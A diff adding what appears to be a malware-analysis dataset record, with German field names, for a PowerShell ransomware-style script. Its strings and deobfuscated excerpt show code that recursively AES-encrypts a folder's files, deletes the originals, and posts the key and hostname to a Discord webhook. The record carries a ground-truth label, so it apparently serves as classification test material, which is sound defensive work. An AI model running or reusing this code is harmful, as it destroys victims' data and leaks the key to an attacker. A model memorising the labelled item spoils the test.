@@ -1,0 +1,153 @@
+{
+  "meta": {
+    "quelldatei": "tech_026_E-D.ps1",
+    "sha256": "eb6dd32c7b026b011bdaf6a08c2c58f7b6fb6eb652c063351936c617e4c26150",
+    "groesse_bytes": 3945,
+    "zeilen": 122,
+    "ground_truth_label": "techniques",
+    "analyse_gekuerzt": false,
+    "hinweis": "Kein Urteil enthalten. Bewertung erfolgt durch das LLM."
+  },
+  "stufe1_extract": {
+    "strings": [
+      "Encrypt",
+      "Decrypt",
+      "**Hostname:** $hostname `n**Key:** $message",
+      "application/json",
+      "Failed to send message to Discord: $_",
+      " + [Convert]::ToBase64String($iv)\r\n\t\tSet-Content -Path ",
+      " -Value $passwordText\r\n\r\n\t\t$webhookSuccess = SendToDiscord $wh $passwordText $hostname\r\n\r\n\t\tif ($webhookSuccess) {\r\n\t\t\tClear-Content ",
+      "\r\n\r\n\t\t\tGet-ChildItem -Path $p -Recurse -File | Where-Object { $_.Name -ne ",
+      " } | ForEach-Object {\r\n\t\t\t\tEncryptFile $_.FullName ($_.FullName + ",
+      ") $aes\r\n\t\t\t}\r\n\t\t} else {\r\n\t\t\tWrite-Host ",
+      "\r\n\t\t\t# Optionally, remove the key file if the webhook is invalid.\r\n\t\t\tRemove-Item ",
+      " \r\n\t\t}\r\n\t}\r\n\r\n\r\n\r\n    if ($d) {\r\n        $keyPath = ",
+      "\r\n        if (Test-Path $keyPath) {\r\n            $passwordText = Get-Content $keyPath\r\n\r\n            # Check if the key and IV are not empty\r\n            if ($passwordText -eq $null -or $passwordText.Split(",
+      ").Count -ne 2) {\r\n                Write-Host ",
+      "\r\n                return\r\n            }\r\n\r\n            $key = [Convert]::FromBase64String($passwordText.Split(",
+      ")[0])\r\n            $iv = [Convert]::FromBase64String($passwordText.Split(",
+      ")[1])\r\n\r\n            # Check for correct key and IV length\r\n            if ($key.Length -ne 32 -or $iv.Length -ne 16) {\r\n                Write-Host ",
+      "\r\n                return\r\n            }\r\n\r\n            $aes.Key = $key\r\n            $aes.IV = $iv\r\n\r\n            try {\r\n                Get-ChildItem -Path $p -Recurse -File | Where-Object { $_.Extension -eq ",
+      " } | ForEach-Object {\r\n                    DecryptFile $_.FullName ($_.FullName -replace ",
+      ") $aes\r\n                }\r\n            } catch {\r\n                Write-Host ",
+      "\r\n            }\r\n        } else {\r\n            Write-Host ",
+      "\r\n        }\r\n    }\r\n}\r\n\r\n#E-D -e -p ",
+      " -wh ",
+      "\r\n\r\n#E-D -d -p "
+    ],
+    "string_anzahl_gesamt": 25,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0
+  },
+  "stufe2_features": {
+    "strings": [
+      "Encrypt",
+      "Decrypt",
+      "**Hostname:** $hostname `n**Key:** $message",
+      "application/json",
+      "Failed to send message to Discord: $_",
+      " + [Convert]::ToBase64String($iv)\r\n\t\tSet-Content -Path ",
+      " -Value $passwordText\r\n\r\n\t\t$webhookSuccess = SendToDiscord $wh $passwordText $hostname\r\n\r\n\t\tif ($webhookSuccess) {\r\n\t\t\tClear-Content ",
+      "\r\n\r\n\t\t\tGet-ChildItem -Path $p -Recurse -File | Where-Object { $_.Name -ne ",
+      " } | ForEach-Object {\r\n\t\t\t\tEncryptFile $_.FullName ($_.FullName + ",
+      ") $aes\r\n\t\t\t}\r\n\t\t} else {\r\n\t\t\tWrite-Host ",
+      "\r\n\t\t\t# Optionally, remove the key file if the webhook is invalid.\r\n\t\t\tRemove-Item ",
+      " \r\n\t\t}\r\n\t}\r\n\r\n\r\n\r\n    if ($d) {\r\n        $keyPath = ",
+      "\r\n        if (Test-Path $keyPath) {\r\n            $passwordText = Get-Content $keyPath\r\n\r\n            # Check if the key and IV are not empty\r\n            if ($passwordText -eq $null -or $passwordText.Split(",
+      ").Count -ne 2) {\r\n                Write-Host ",
+      "\r\n                return\r\n            }\r\n\r\n            $key = [Convert]::FromBase64String($passwordText.Split(",
+      ")[0])\r\n            $iv = [Convert]::FromBase64String($passwordText.Split(",
+      ")[1])\r\n\r\n            # Check for correct key and IV length\r\n            if ($key.Length -ne 32 -or $iv.Length -ne 16) {\r\n                Write-Host ",
+      "\r\n                return\r\n            }\r\n\r\n            $aes.Key = $key\r\n            $aes.IV = $iv\r\n\r\n            try {\r\n                Get-ChildItem -Path $p -Recurse -File | Where-Object { $_.Extension -eq ",
+      " } | ForEach-Object {\r\n                    DecryptFile $_.FullName ($_.FullName -replace ",
+      ") $aes\r\n                }\r\n            } catch {\r\n                Write-Host ",
+      "\r\n            }\r\n        } else {\r\n            Write-Host ",
+      "\r\n        }\r\n    }\r\n}\r\n\r\n#E-D -e -p ",
+      " -wh ",
+      "\r\n\r\n#E-D -d -p "
+    ],
+    "string_anzahl_gesamt": 25,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Clear-Content",
+      "Get-ChildItem",
+      "Get-Content",
+      "Invoke-RestMethod",
+      "New-Object",
+      "Remove-Item",
+      "Set-Content",
+      "Test-Path",
+      "Where-Object",
+      "Write-Host"
+    ],
+    "auffaellige_tokens": {
+      "frombase64": 2
+    },
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": [
+        "C:\\Users\\$env:USERNAME\\Documents\\test\\"
+      ]
+    }
+  },
+  "stufe3_structure": {
+    "strings": [
+      "Encrypt",
+      "Decrypt",
+      "**Hostname:** $hostname `n**Key:** $message",
+      "application/json",
+      "Failed to send message to Discord: $_",
+      " + [Convert]::ToBase64String($iv)\r\n\t\tSet-Content -Path ",
+      " -Value $passwordText\r\n\r\n\t\t$webhookSuccess = SendToDiscord $wh $passwordText $hostname\r\n\r\n\t\tif ($webhookSuccess) {\r\n\t\t\tClear-Content ",
+      "\r\n\r\n\t\t\tGet-ChildItem -Path $p -Recurse -File | Where-Object { $_.Name -ne ",
+      " } | ForEach-Object {\r\n\t\t\t\tEncryptFile $_.FullName ($_.FullName + ",
+      ") $aes\r\n\t\t\t}\r\n\t\t} else {\r\n\t\t\tWrite-Host ",
+      "\r\n\t\t\t# Optionally, remove the key file if the webhook is invalid.\r\n\t\t\tRemove-Item ",
+      " \r\n\t\t}\r\n\t}\r\n\r\n\r\n\r\n    if ($d) {\r\n        $keyPath = ",
+      "\r\n        if (Test-Path $keyPath) {\r\n            $passwordText = Get-Content $keyPath\r\n\r\n            # Check if the key and IV are not empty\r\n            if ($passwordText -eq $null -or $passwordText.Split(",
+      ").Count -ne 2) {\r\n                Write-Host ",
+      "\r\n                return\r\n            }\r\n\r\n            $key = [Convert]::FromBase64String($passwordText.Split(",
+      ")[0])\r\n            $iv = [Convert]::FromBase64String($passwordText.Split(",
+      ")[1])\r\n\r\n            # Check for correct key and IV length\r\n            if ($key.Length -ne 32 -or $iv.Length -ne 16) {\r\n                Write-Host ",
+      "\r\n                return\r\n            }\r\n\r\n            $aes.Key = $key\r\n            $aes.IV = $iv\r\n\r\n            try {\r\n                Get-ChildItem -Path $p -Recurse -File | Where-Object { $_.Extension -eq ",
+      " } | ForEach-Object {\r\n                    DecryptFile $_.FullName ($_.FullName -replace ",
+      ") $aes\r\n                }\r\n            } catch {\r\n                Write-Host ",
+      "\r\n            }\r\n        } else {\r\n            Write-Host ",
+      "\r\n        }\r\n    }\r\n}\r\n\r\n#E-D -e -p ",
+      " -wh ",
+      "\r\n\r\n#E-D -d -p "
+    ],
+    "string_anzahl_gesamt": 25,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Clear-Content",
+      "Get-ChildItem",
+      "Get-Content",
+      "Invoke-RestMethod",
+      "New-Object",
+      "Remove-Item",
+      "Set-Content",
+      "Test-Path",
+      "Where-Object",
+      "Write-Host"
+    ],
+    "auffaellige_tokens": {
+      "frombase64": 2
+    },
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": [
+        "C:\\Users\\$env:USERNAME\\Documents\\test\\"
+      ]
+    },
+    "deobfuskiert_auszug": "function E-D {\r\n    param (\r\n        [Parameter(Mandatory=$true, ParameterSetName=\"Encrypt\")]\r\n        [switch]$e,\r\n\r\n        [Parameter(Mandatory=$true, ParameterSetName=\"Decrypt\")]\r\n        [switch]$d,\r\n\r\n        [Parameter(Mandatory=$true)]\r\n        [string]$p,\r\n\r\n        [Parameter(Mandatory=$true, ParameterSetName=\"Encrypt\")]\r\n        [string]$wh\r\n    )\r\n\r\n    function SendToDiscord($webhook, $message, $hostname) {\r\n\t\t$body = @{\r\n\t\t\tcontent = \"**Hostname:** $hostname n**Key:** $message\"\r\n\t\t} | ConvertTo-Json\r\n\t\t\r\n\t\ttry {\r\n\t\t\tInvoke-RestMethod -Uri $webhook -Method POST -Body $body -ContentType 'application/json'\r\n\t\t\treturn $true\r\n\t\t} catch {\r\n\t\t\tWrite-Host \"Failed to send message to Discord: $_\"\r\n\t\t\treturn $false\r\n\t\t}\r\n\t}\r\n\r\n\r\n    $hostname = [System.Environment]::MachineName\r\n\r\n    function EncryptFile($inputFile, $outputFile, $aes) {\r\n        $aesEncryptor = $aes.CreateEncryptor()\r\n\r\n        $bytesToBeEncrypted = [System.IO.File]::ReadAllBytes($inputFile)\r\n        $bytesEncrypted = $aesEncryptor.TransformFinalBlock($bytesToBeEncrypted, 0, $bytesToBeEncrypted.Length)\r\n\r\n        [System.IO.File]::WriteAllBytes($outputFile, $bytesEncrypted)\r\n        Remove-Item $inputFile\r\n    }\r\n\r\n    function DecryptFile($inputFile, $outputFile, $aes) {\r\n        $aesDecryptor = $aes.CreateDecryptor()\r\n\r\n        $bytesToBeDecrypted = [System.IO.File]::ReadAllBytes($inputFile)\r\n        $bytesDecrypted = $aesDecryptor.TransformFinalBlock($bytesToBeDecrypted, 0, $bytesToBeDecrypted.Length)\r\n\r\n        [System.IO.File]::WriteAllBytes($outputFile, $bytesDecrypted)\r\n        Remove-Item $inputFile\r\n    }\r\n\r\n    $key = New-Object byte[] 32\r\n    $iv = New-Object byte[] 16\r\n    $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider\r\n\r\n    if ($e) {\r\n\t\t$aes.GenerateKey()\r\n\t\t$aes.GenerateIV()\r\n\t\t$key = $aes.Key\r\n\t\t$iv = $aes.IV\r\n\r\n\t\t$passwordText = [Convert]::ToBase64String($key) + \"|\" + [Convert]::ToBase64String($iv)\r\n\t\tSet-Content -Path \"$p\\key.txt\" -Value $passwordText\r\n",
+    "dekodierte_befehle": [],
+    "beobachtete_abfolge": [
+      "Base64-Inhalt dekodieren"
+    ]
+  }
+}
